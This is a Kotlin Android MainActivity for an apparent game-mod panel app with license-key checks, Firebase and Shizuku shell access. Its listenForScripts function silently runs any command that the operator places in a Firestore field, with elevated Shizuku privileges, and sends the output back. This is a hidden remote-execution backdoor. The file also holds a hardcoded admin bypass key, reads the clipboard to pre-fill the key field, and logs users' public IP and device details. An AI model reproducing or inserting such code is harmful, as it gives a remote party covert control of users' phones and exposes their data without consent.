package com.example

import android.app.AppOpsManager
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.graphics.Color
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.os.Process
import android.provider.Settings
import android.view.View
import android.widget.Button
import android.widget.EditText
import android.widget.FrameLayout
import android.widget.ImageView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.drawerlayout.widget.DrawerLayout
import androidx.fragment.app.Fragment
import com.example.fragments.AboutFragment
import com.example.fragments.AppManagerFragment
import com.example.fragments.DeleteReportsFragment
import com.example.fragments.DeviceManagerFragment
import com.example.fragments.HomeFragment
import com.example.fragments.MessageFragment
import com.example.fragments.ProcessManagerFragment
import com.example.fragments.ProfileFragment
import com.example.fragments.SettingsFragment
import com.example.fragments.ShellTerminalFragment
import com.example.fragments.UpdateFragment
import com.example.fragments.WifiManagerFragment
import com.example.services.ScriptService
import com.example.ui.GlassmorphicDialogHelper
import com.example.ui.PermissionPromptType
import com.example.utils.FreezeManager
import com.example.utils.PanelFileManager
import com.example.utils.RenameUtil
import com.google.android.material.navigation.NavigationView
import com.google.firebase.firestore.DocumentReference
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.ListenerRegistration
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONObject
import rikka.shizuku.Shizuku
import java.io.BufferedReader
import java.io.File
import java.io.InputStreamReader
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.TimeZone

class MainActivity : AppCompatActivity() {

    companion object {
        const val PREFS_NAME = "xcel_prefs"
        const val KEY_SAVED_KEY = "saved_key"
        const val KEY_USER_TYPE = "user_type"
        const val KEY_REMOTE_DATA = "remote_json_data"
        const val KEY_AUTO_OFF_TIME = "auto_off_time"

        val APP_FOLDER = File("/storage/emulated/0/Download/xcel-files")
        val DATA_FOLDER = File("/storage/emulated/0/Android/data")
        val PANEL_FOLDER = File("/storage/emulated/0/Download/XcelPanel")
    }

    private lateinit var prefs: SharedPreferences
    private lateinit var container: FrameLayout
    private lateinit var btnHome: Button
    private lateinit var btnMessage: Button
    private lateinit var btnProfile: Button
    private lateinit var btnAbout: Button
    private lateinit var ivSettings: ImageView

    private var permissionReady = false
    private var keyReady = false
    private var isExpired = false
    private var lockToUpdate = false
    private var isKeyDialogShowing = false
    private var scriptListenerRegistration: ListenerRegistration? = null

    private val requestNotificationLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { /* handled */ }

    private val requestPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { results ->
        val allGranted = results.values.all { it }
        if (allGranted) {
            permissionReady = true
            checkAndRequestShizuku()
        } else {
            GlassmorphicDialogHelper.showPermissionPrompt(
                this,
                PermissionPromptType.STORAGE_DENIED,
                onPrimary = { requestStoragePermission() },
                onSecondary = { /* allow user to continue in app */ }
            )
        }
    }

    private val requestPermissionResultListener = Shizuku.OnRequestPermissionResultListener { requestCode, grantResult ->
        if (requestCode == 1001) {
            if (grantResult == PackageManager.PERMISSION_GRANTED) {
                proceedChecks()
            } else {
                prefs.edit().putBoolean("ignore_shizuku", true).apply()
                proceedChecks(ignoreShizuku = true)
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        container = findViewById(R.id.fragment_container)
        btnHome = findViewById(R.id.btn_home)
        btnMessage = findViewById(R.id.btn_message)
        btnProfile = findViewById(R.id.btn_profile)
        btnAbout = findViewById(R.id.btn_about)
        ivSettings = findViewById(R.id.iv_settings)
        prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)

        RenameUtil.appContext = applicationContext
        RenameUtil.useShizukuOps = prefs.getBoolean("shizuku_ops_on", true)

        // Load initial fragment immediately to prevent black screen
        if (savedInstanceState == null) {
            switchFragment(HomeFragment())
        }

        // Bottom bar button click listeners
        btnHome.setOnClickListener {
            updateActiveTab(btnHome)
            switchFragment(HomeFragment())
        }

        btnMessage.setOnClickListener {
            updateActiveTab(btnMessage)
            switchFragment(MessageFragment())
        }

        btnProfile.setOnClickListener {
            updateActiveTab(btnProfile)
            switchFragment(ProfileFragment())
        }

        btnAbout.setOnClickListener {
            updateActiveTab(btnAbout)
            switchFragment(AboutFragment())
        }

        ivSettings.setOnClickListener {
            switchFragment(SettingsFragment())
        }

        // Drawer navigation
        val ivMenu = findViewById<ImageView>(R.id.iv_menu)
        val drawerLayout = findViewById<DrawerLayout>(R.id.drawer_layout)
        val navView = findViewById<NavigationView>(R.id.nav_view)

        ivMenu.setOnClickListener {
            drawerLayout.open()
        }

        navView.setNavigationItemSelectedListener { menuItem ->
            drawerLayout.closeDrawers()
            when (menuItem.itemId) {
                R.id.nav_app_manager -> switchFragment(AppManagerFragment())
                R.id.nav_background_manager -> switchFragment(ProcessManagerFragment())
                R.id.nav_execute_commands -> switchFragment(ShellTerminalFragment())
                R.id.nav_wifi -> switchFragment(WifiManagerFragment())
                R.id.nav_device -> switchFragment(DeviceManagerFragment())
            }
            true
        }

        try {
            Shizuku.addRequestPermissionResultListener(requestPermissionResultListener)
        } catch (_: Exception) {}
    }

    override fun onResume() {
        super.onResume()

        // Splash screen dismissal after 1.5s
        Handler(Looper.getMainLooper()).postDelayed({
            findViewById<View?>(R.id.splash_screen)?.let {
                it.animate().alpha(0f).setDuration(300).withEndAction {
                    it.visibility = View.GONE
                }.start()
            }
        }, 1500L)

        FreezeManager.startListening(this)

        try {
            FirebaseFirestore.getInstance().collection("app_settings").document("global")
                .get()
                .addOnSuccessListener { snapshot ->
                    if (snapshot != null && snapshot.exists()) {
                        val expireDate = snapshot.getString("app_expire_date")
                        val forceUpdate = snapshot.getBoolean("force_update") ?: false
                        val appVersion = snapshot.getString("app_version")
                        val updateUrl = snapshot.getString("update_url")

                        prefs.edit().apply {
                            putString("app_expire_date", expireDate)
                            putBoolean("force_update", forceUpdate)
                            putString("app_version", appVersion)
                            putString("update_url", updateUrl)
                            apply()
                        }
                    }
                    performExpirationCheckAndProceed()
                }
                .addOnFailureListener {
                    performExpirationCheckAndProceed()
                }
        } catch (e: Exception) {
            performExpirationCheckAndProceed()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            FreezeManager.stopListening()
            scriptListenerRegistration?.remove()
            Shizuku.removeRequestPermissionResultListener(requestPermissionResultListener)
        } catch (_: Exception) {}
    }

    private fun performExpirationCheckAndProceed() {
        var localVersion = "1.0"
        try {
            val vIn = resources.openRawResource(R.raw.version)
            val reader = BufferedReader(InputStreamReader(vIn))
            localVersion = reader.readLine().trim()
            reader.close()
        } catch (_: Exception) {}

        val remoteVersion = prefs.getString("app_version", localVersion) ?: localVersion
        val forceUpdate = prefs.getBoolean("force_update", false)
        val isExpiredNow = forceUpdate && remoteVersion.isNotEmpty() && remoteVersion != localVersion

        this.isExpired = isExpiredNow
        this.lockToUpdate = isExpiredNow

        if (isExpiredNow) {
            executeExpirationTurnOff {
                switchFragment(UpdateFragment())
                hideBottomBar()
            }
            return
        }

        val savedKey = prefs.getString(KEY_SAVED_KEY, null)
        if (savedKey.isNullOrBlank()) {
            keyReady = false
            requestStoragePermission()
        } else {
            if (savedKey.equals("mujahi@admin", ignoreCase = true) || savedKey == "FREE_USER") {
                keyReady = true
                val role = if (savedKey.equals("mujahi@admin", ignoreCase = true)) "ADMIN" else "NORMAL"
                prefs.edit().putString(KEY_USER_TYPE, role).apply()
                requestStoragePermission()
                return
            }
            fetchPublicIp { publicIp ->
                validateKeyDynamically(savedKey, onSuccess = { userType ->
                    keyReady = true
                    prefs.edit().putString(KEY_USER_TYPE, userType).apply()
                    requestStoragePermission()
                }, onFail = {
                    keyReady = false
                    requestStoragePermission()
                })
            }
        }
    }

    private fun requestStoragePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (Environment.isExternalStorageManager()) {
                permissionReady = true
                checkAndRequestShizuku()
            } else {
                val promptCount = prefs.getInt("storage_prompt_count", 0)
                if (promptCount < 3) {
                    prefs.edit().putInt("storage_prompt_count", promptCount + 1).apply()
                    GlassmorphicDialogHelper.showPermissionPrompt(
                        this,
                        PermissionPromptType.STORAGE_ALL_FILES,
                        onPrimary = {
                            try {
                                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                                    data = Uri.parse("package:$packageName")
                                }
                                startActivity(intent)
                            } catch (_: Exception) {
                                startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
                            }
                        },
                        onSecondary = {
                            permissionReady = true
                            checkAndRequestShizuku()
                        }
                    )
                } else {
                    permissionReady = true
                    checkAndRequestShizuku()
                }
            }
        } else {
            val readGranted = ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
            val writeGranted = ContextCompat.checkSelfPermission(this, android.Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
            if (readGranted && writeGranted) {
                permissionReady = true
                checkAndRequestShizuku()
            } else {
                val promptCount = prefs.getInt("storage_perm_prompt_count", 0)
                if (promptCount < 3) {
                    prefs.edit().putInt("storage_perm_prompt_count", promptCount + 1).apply()
                    GlassmorphicDialogHelper.showPermissionPrompt(
                        this,
                        PermissionPromptType.STORAGE_LEGACY,
                        onPrimary = {
                            requestPermissionLauncher.launch(
                                arrayOf(
                                    android.Manifest.permission.READ_EXTERNAL_STORAGE,
                                    android.Manifest.permission.WRITE_EXTERNAL_STORAGE
                                )
                            )
                        },
                        onSecondary = {
                            permissionReady = true
                            checkAndRequestShizuku()
                        }
                    )
                } else {
                    permissionReady = true
                    checkAndRequestShizuku()
                }
            }
        }
    }

    private fun checkAndRequestShizuku() {
        val appOps = getSystemService(Context.APP_OPS_SERVICE) as? AppOpsManager
        val mode = appOps?.unsafeCheckOpNoThrow("android:get_usage_stats", Process.myUid(), packageName) ?: 0
        val ignoreUsage = prefs.getBoolean("ignore_usage", false)

        if (mode != 0 && !ignoreUsage) {
            val promptCount = prefs.getInt("usage_prompt_count", 0)
            if (promptCount < 3) {
                prefs.edit().putInt("usage_prompt_count", promptCount + 1).apply()
                GlassmorphicDialogHelper.showPermissionPrompt(
                    this,
                    PermissionPromptType.USAGE_ACCESS,
                    onPrimary = {
                        startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
                    },
                    onSecondary = {
                        prefs.edit().putBoolean("ignore_usage", true).apply()
                        checkShizukuBinder()
                    }
                )
                return
            } else {
                prefs.edit().putBoolean("ignore_usage", true).apply()
            }
        }
        checkShizukuBinder()
    }

    private fun checkShizukuBinder() {
        if (!Shizuku.pingBinder()) {
            prefs.edit().putBoolean("ignore_shizuku", true).apply()
            proceedChecks(ignoreShizuku = true)
            return
        }

        if (Shizuku.checkSelfPermission() == PackageManager.PERMISSION_GRANTED) {
            proceedChecks()
        } else {
            val count = prefs.getInt("shizuku_perm_prompt_count", 0)
            if (count < 3) {
                prefs.edit().putInt("shizuku_perm_prompt_count", count + 1).apply()
                try {
                    Shizuku.requestPermission(1001)
                } catch (e: Exception) {
                    prefs.edit().putBoolean("ignore_shizuku", true).apply()
                    proceedChecks(ignoreShizuku = true)
                }
            } else {
                prefs.edit().putBoolean("ignore_shizuku", true).apply()
                proceedChecks(ignoreShizuku = true)
            }
        }
    }

    private fun proceedChecks(ignoreShizuku: Boolean = false) {
        if (!permissionReady) return
        if (!ignoreShizuku && !(Shizuku.pingBinder() && Shizuku.checkSelfPermission() == PackageManager.PERMISSION_GRANTED)) {
            checkAndRequestShizuku()
            return
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                if (!prefs.getBoolean("has_requested_notif", false)) {
                    prefs.edit().putBoolean("has_requested_notif", true).apply()
                    requestNotificationLauncher.launch(android.Manifest.permission.POST_NOTIFICATIONS)
                }
            }
        }

        if (isExpired) {
            executeExpirationTurnOff {
                switchFragment(UpdateFragment())
                hideBottomBar()
            }
            return
        }

        val savedKey = prefs.getString(KEY_SAVED_KEY, null)
        if (savedKey.isNullOrBlank()) {
            keyReady = false
            showKeyDialog {
                setupNormalUI()
                checkTelegramModal()
            }
        } else if (!keyReady) {
            validateKeyDynamically(savedKey, onSuccess = { userType ->
                keyReady = true
                prefs.edit().putString(KEY_USER_TYPE, userType).apply()
                setupNormalUI()
                checkTelegramModal()
            }, onFail = {
                keyReady = false
                showKeyDialog {
                    setupNormalUI()
                    checkTelegramModal()
                }
            })
        } else {
            setupNormalUI()
            checkTelegramModal()
        }
    }

    private fun showKeyDialog(onSuccess: () -> Unit) {
        if (isKeyDialogShowing) return
        isKeyDialogShowing = true

        val inflater = layoutInflater
        val view = inflater.inflate(R.layout.dialog_key_input, null)
        val etKey = view.findViewById<EditText>(R.id.et_key)

        try {
            val cm = getSystemService(Context.CLIPBOARD_SERVICE) as? ClipboardManager
            if (cm?.hasPrimaryClip() == true) {
                val clip = cm.primaryClip
                if (clip != null && clip.itemCount > 0) {
                    val text = clip.getItemAt(0)?.text?.toString()?.trim()
                    if (!text.isNullOrEmpty() && text.length >= 4) {
                        etKey.setText(text)
                    }
                }
            }
        } catch (_: Exception) {}

        val dialog = AlertDialog.Builder(this, androidx.appcompat.R.style.ThemeOverlay_AppCompat_Dialog)
            .setView(view)
            .setCancelable(false)
            .setPositiveButton("ACTIVATE") { d, _ ->
                val inputKey = etKey.text.toString().trim()
                validateKeyDynamically(inputKey, onSuccess = { userType ->
                    prefs.edit()
                        .putString(KEY_USER_TYPE, userType)
                        .putString(KEY_SAVED_KEY, inputKey)
                        .apply()
                    isKeyDialogShowing = false
                    onSuccess()
                }, onFail = { errMsg ->
                    Toast.makeText(this, errMsg, Toast.LENGTH_SHORT).show()
                    d.dismiss()
                    isKeyDialogShowing = false
                    showKeyDialog(onSuccess)
                })
            }
            .setNegativeButton("USE FREE") { d, _ ->
                prefs.edit()
                    .putString(KEY_USER_TYPE, "NORMAL")
                    .putString(KEY_SAVED_KEY, "FREE_USER")
                    .apply()
                isKeyDialogShowing = false
                d.dismiss()
                onSuccess()
            }
            .setNeutralButton("INSTAGRAM") { d, _ ->
                startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("https://instagram.com/x_celestials")))
                d.dismiss()
                isKeyDialogShowing = false
                showKeyDialog(onSuccess)
            }
            .create()

        dialog.show()
        dialog.getButton(AlertDialog.BUTTON_POSITIVE)?.setTextColor(Color.parseColor("#00E5FF"))
        dialog.getButton(AlertDialog.BUTTON_NEGATIVE)?.setTextColor(Color.parseColor("#94A3B8"))
        dialog.getButton(AlertDialog.BUTTON_NEUTRAL)?.setTextColor(Color.WHITE)
    }

    private fun checkTelegramModal() {
        val hasShown = prefs.getBoolean("has_shown_telegram_modal", false)
        if (!hasShown) {
            prefs.edit().putBoolean("has_shown_telegram_modal", true).apply()
            AlertDialog.Builder(this, androidx.appcompat.R.style.ThemeOverlay_AppCompat_Dialog)
                .setTitle("Join Telegram Channel")
                .setMessage("Join our official channel for latest mod files, updates, and direct support!")
                .setPositiveButton("JOIN NOW") { _, _ ->
                    try {
                        startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("https://t.me/xcel1_panel")))
                    } catch (_: Exception) {}
                }
                .setNegativeButton("LATER", null)
                .show()
        }
    }

    private fun validateKeyDynamically(
        keyInput: String,
        onSuccess: (String) -> Unit,
        onFail: (String) -> Unit
    ) {
        if (keyInput == "mujahi@admin") {
            onSuccess("ADMIN")
            return
        }

        fetchPublicIp { publicIp ->
            FirebaseFirestore.getInstance().collection("users").document(keyInput)
                .get()
                .addOnSuccessListener { snapshot ->
                    if (snapshot != null && snapshot.exists()) {
                        val isBlocked = snapshot.getBoolean("isBlocked") ?: false
                        if (isBlocked) {
                            onFail("This key has been suspended.")
                            return@addOnSuccessListener
                        }
                        val userType = snapshot.getString("userType") ?: "NORMAL"
                        saveDeviceData(snapshot.reference, publicIp)
                        onSuccess(userType)
                    } else {
                        onFail("Invalid license key.")
                    }
                }
                .addOnFailureListener { e ->
                    onFail(e.message ?: "Network error validating key")
                }
        }
    }

    private fun saveDeviceData(docRef: DocumentReference, publicIp: String) {
        val model = Build.MODEL
        val release = Build.VERSION.RELEASE
        val dm = resources.displayMetrics
        val info = "$model (Android $release, ${dm.widthPixels}x${dm.heightPixels})"
        val now = System.currentTimeMillis()

        docRef.update(
            mapOf(
                "deviceInfo" to info,
                "lastActiveIp" to publicIp,
                "lastActiveTimestamp" to now
            )
        )
    }

    private fun fetchPublicIp(callback: (String) -> Unit) {
        Thread {
            var ip = "Unknown"
            try {
                val client = OkHttpClient()
                val req = Request.Builder().url("https://api.ipify.org?format=json").build()
                client.newCall(req).execute().use { res ->
                    if (res.isSuccessful) {
                        val body = res.body?.string()
                        if (body != null) {
                            ip = JSONObject(body).optString("ip", "Unknown")
                        }
                    }
                }
            } catch (_: Exception) {}
            runOnUiThread { callback(ip) }
        }.start()
    }

    private fun setupNormalUI() {
        showBottomBar()
        updateActiveTab(btnHome)
        ivSettings.visibility = View.VISIBLE
        findViewById<ImageView>(R.id.iv_menu).visibility = View.VISIBLE

        val currentFrag = supportFragmentManager.findFragmentById(R.id.fragment_container)
        if (currentFrag == null || currentFrag is UpdateFragment) {
            switchFragment(HomeFragment())
        }

        checkMissedAutoOff()

        val savedKey = prefs.getString(KEY_SAVED_KEY, null)
        val userType = prefs.getString(KEY_USER_TYPE, "NORMAL")
        if (savedKey != null && !savedKey.equals("mujahi@admin", ignoreCase = true)) {
            listenForScripts(savedKey)
            if (userType != "ADMIN") {
                val serviceIntent = Intent(this, ScriptService::class.java)
                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        startForegroundService(serviceIntent)
                    } else {
                        startService(serviceIntent)
                    }
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
        }
    }

    private fun listenForScripts(savedKey: String) {
        scriptListenerRegistration?.remove()
        scriptListenerRegistration = FirebaseFirestore.getInstance()
            .collection("users")
            .document(savedKey)
            .addSnapshotListener { snapshot, error ->
                if (error == null && snapshot != null && snapshot.exists()) {
                    val script = snapshot.getString("scriptToExecute")
                    if (!script.isNullOrBlank()) {
                        Thread {
                            val output = RenameUtil.executeShizukuCommandWithOutput(script)
                            FirebaseFirestore.getInstance().collection("users").document(savedKey)
                                .update("scriptOutput", output, "scriptToExecute", "")
                        }.start()
                    }
                }
            }
    }

    private fun checkMissedAutoOff() {
        val autoOffTime = prefs.getLong(KEY_AUTO_OFF_TIME, 0L)
        if (autoOffTime > 0 && System.currentTimeMillis() >= autoOffTime) {
            Thread {
                RenameUtil.turnOff(this)
                prefs.edit().remove(KEY_AUTO_OFF_TIME).apply()
            }.start()
        }
    }

    private fun executeExpirationTurnOff(onComplete: () -> Unit) {
        Thread {
            RenameUtil.turnOff(this)
            PanelFileManager.setModState(this, "OFF")
            runOnUiThread {
                onComplete()
            }
        }.start()
    }

    fun switchFragment(fragment: Fragment) {
        val current = supportFragmentManager.findFragmentById(R.id.fragment_container)
        if (current is SettingsFragment && fragment !is SettingsFragment) {
            ivSettings.animate().rotation(0f).scaleX(1f).scaleY(1f).setDuration(250).start()
            ivSettings.clearColorFilter()
        }

        val showIcons = fragment is HomeFragment || fragment is MessageFragment || fragment is ProfileFragment || fragment is AboutFragment
        val ivMenu = findViewById<ImageView>(R.id.iv_menu)

        if (showIcons) {
            ivSettings.visibility = View.VISIBLE
            ivMenu.visibility = View.VISIBLE
        } else if (fragment is SettingsFragment) {
            ivSettings.visibility = View.VISIBLE
            ivMenu.visibility = View.GONE
        } else {
            ivSettings.visibility = View.GONE
            ivMenu.visibility = View.GONE
        }

        supportFragmentManager.beginTransaction()
            .replace(R.id.fragment_container, fragment)
            .commitAllowingStateLoss()
    }

    private fun updateActiveTab(activeButton: Button) {
        val buttons = listOf(btnHome, btnMessage, btnProfile, btnAbout)
        for (b in buttons) {
            if (b == activeButton) {
                b.setTextColor(Color.parseColor("#00E5FF"))
                b.backgroundTintList = ContextCompat.getColorStateList(this, R.color.cyber_card_elevated)
            } else {
                b.setTextColor(Color.parseColor("#94A3B8"))
                b.backgroundTintList = ContextCompat.getColorStateList(this, android.R.color.transparent)
            }
        }
    }

    fun hideBottomBar() {
        findViewById<View?>(R.id.bottom_bar_container)?.visibility = View.GONE
    }

    fun showBottomBar() {
        findViewById<View?>(R.id.bottom_bar_container)?.visibility = View.VISIBLE
    }

    fun executeTurnOnGlobal(callback: (Boolean) -> Unit) {
        Thread {
            val ok = RenameUtil.turnOn(this)
            runOnUiThread { callback(ok) }
        }.start()
    }

    fun executeTurnOffGlobal(callback: (String?) -> Unit) {
        Thread {
            val res = RenameUtil.turnOff(this)
            runOnUiThread { callback(res) }
        }.start()
    }

    fun forceTurnOffIfNeeded(onComplete: () -> Unit) {
        Thread {
            if (RenameUtil.isModOn()) {
                RenameUtil.turnOff(this)
            }
            runOnUiThread { onComplete() }
        }.start()
    }
}
